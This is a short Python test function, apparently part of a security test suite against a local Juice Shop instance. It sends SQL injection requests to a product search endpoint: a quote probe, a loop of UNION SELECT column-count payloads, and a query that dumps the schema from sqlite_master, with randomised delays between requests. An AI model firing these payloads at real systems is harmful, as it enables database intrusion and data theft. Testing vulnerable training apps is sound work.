...
def test_exfiltrate_schema():
    ...
    r.get('http://localhost:3000/rest/products/search?q=%27;', headers=headers)
    time.sleep(random.random() + random.randint(2,4))
    ...
    for i in range(1,10):
        ...
        res = r.get(f"http://localhost:3000/rest/products/search?q=%27)) UNION SELECT {cols}--", headers=headers)
        time.sleep(random.random() + random.randint(1,2))

    # Page leaks that DB is sqlite --> exfiltrate schema
    res = r.get("http://localhost:3000/rest/products/search?q=asdf')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--", headers=headers)
    time.sleep(random.random() + random.randint(2,4))
